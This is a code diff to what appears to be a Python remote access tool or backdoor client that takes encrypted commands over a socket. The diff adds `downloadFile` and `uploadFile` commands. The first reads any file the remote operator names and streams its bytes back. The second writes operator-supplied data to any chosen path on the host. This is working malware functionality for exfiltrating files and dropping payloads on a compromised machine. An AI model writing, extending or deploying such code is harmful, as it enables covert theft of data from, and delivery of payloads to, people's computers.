@@ -320,6 +320,20 @@ def decryptFileAESCFB(filename):
         return 'Oops! There is an error while decrypting.\n'
 
 
+def sendFile(sock, file):
+    try:
+        with open(file, 'rb') as f:
+            fileData = f.read()
+            # Begin sending file
+            sock.sendall(fileData)
+            time.sleep(1)
+            sock.sendall('EOFX'.encode())
+        f.close()
+        return '> Download: ' + file + ' complete.\n'
+    except:
+        return '> Error downloading file: ' + file + '.\n'
+
+
 s.sendall(encryptData('SYMMETRIC CIPHER\n'))
 s.sendall(encryptData('EOFX'))
 
@@ -396,6 +410,28 @@ while 1:
                 s.sendall(encryptData(encryptFileAESCFB(args['file'])))
             if decrypted[:18] == "decryptFileAESCFB ":
                 s.sendall(encryptData(decryptFileAESCFB(args['file'])))
+        s.sendall(encryptData('EOFX'))
+    elif decrypted[:12] == "downloadFile":
+        try:
+            if os.path.isfile(decrypted[13:]):
+                filemsg = sendFile(s, decrypted[13:])
+                s.sendall(encryptData(filemsg))
+                s.sendall(encryptData('EOFX'))
+        except:
+            s.sendall(encryptData('Error: file not found.\n'))
+            s.sendall(encryptData('EOFX'))
+
+    elif decrypted[:10] == 'uploadFile':
+        g = open(decrypted[11:], 'wb')
+        while True:
+            l = s.recv(1024)
+            try:
+                if l.decode() == 'EOFX':
+                    break
+            except:
+                pass
+            g.write(l)
+        g.close()
         s.sendall(encryptData('EOFX'))
     else:
         s.sendall(encryptData('Command Not Found\n'))
